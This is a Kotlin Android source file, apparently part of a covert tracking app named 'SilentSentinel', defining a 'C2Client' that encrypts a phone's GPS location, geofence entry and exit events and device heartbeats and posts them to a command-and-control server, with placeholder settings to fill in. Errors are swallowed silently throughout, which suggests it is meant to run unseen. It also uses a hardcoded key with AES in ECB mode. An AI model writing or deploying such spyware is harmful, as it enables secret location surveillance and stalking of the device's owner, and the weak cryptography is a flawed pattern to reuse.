package com.silentsentinel

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

object C2Client {

    // CHANGE THESE:
    const val C2_URL = "https://your-server.com/api/location"
    const val DEVICE_ID = "device_001"
    private const val AES_KEY = "a1b2c3d4e5f6g7h8"

    /**
     * Standard location report (encrypted).
     */
    fun report(lat: Double, lng: Double, accuracy: Float, provider: String, batteryLevel: Int) {
        try {
            val payload = JSONObject().apply {
                put("device_id", DEVICE_ID)
                put("lat", lat)
                put("lng", lng)
                put("accuracy", accuracy.toDouble())
                put("provider", provider)
                put("battery", batteryLevel)
                put("timestamp", System.currentTimeMillis())
                put("type", "location")
            }
            sendEncrypted(payload.toString())
        } catch (e: Exception) { /* silent */ }
    }

    /**
     * Geofence event (entry/exit).
     */
    fun reportGeofenceEvent(zoneName: String, eventType: String, lat: Double, lng: Double) {
        try {
            val payload = JSONObject().apply {
                put("device_id", DEVICE_ID)
                put("type", "geofence")
                put("zone", zoneName)
                put("event", eventType)
                put("lat", lat)
                put("lng", lng)
                put("timestamp", System.currentTimeMillis())
            }
            sendEncrypted(payload.toString())
        } catch (e: Exception) { /* silent */ }
    }

    /**
     * Full device heartbeat (encrypted).
     */
    fun sendHeartbeat(context: Context, lat: Double, lng: Double,
                      accuracy: Float, provider: String,
                      batteryLevel: Int, isCharging: Boolean) {
        try {
            val payload = DeviceProfile.buildHeartbeat(
                context, lat, lng, accuracy, provider, batteryLevel, isCharging
            ).apply {
                put("type", "heartbeat")
            }
            sendEncrypted(payload.toString())
        } catch (e: Exception) { /* silent */ }
    }

    /**
     * Fetch geofence zones from server.
     * Returns JSON array string, or null on failure.
     */
    fun fetchGeofenceConfig(): String? {
        return try {
            val url = URL("$C2_URL/geofence_config")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.setRequestProperty("X-Device-ID", DEVICE_ID)

            val response = conn.inputStream.bufferedReader().readText()
            conn.disconnect()

            val json = JSONObject(response)
            if (json.optString("status") == "ok") {
                json.optJSONArray("zones")?.toString()
            } else null
        } catch (e: Exception) {
            null
        }
    }

    private fun sendEncrypted(plainText: String) {
        val encrypted = encrypt(plainText)
        val data = JSONObject().apply { put("d", encrypted) }

        val url = URL(C2_URL)
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("Content-Type", "application/json")
        conn.doOutput = true
        conn.connectTimeout = 15000
        conn.readTimeout = 15000

        OutputStreamWriter(conn.outputStream).use { it.write(data.toString()) }
        conn.inputStream.use { it.readBytes() }  // Consume response
        conn.disconnect()
    }

    private fun encrypt(plainText: String): String {
        val key = SecretKeySpec(AES_KEY.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
        cipher.init(Cipher.ENCRYPT_MODE, key)
        return android.util.Base64.encodeToString(
            cipher.doFinal(plainText.toByteArray()),
            android.util.Base64.NO_WRAP
        )
    }
}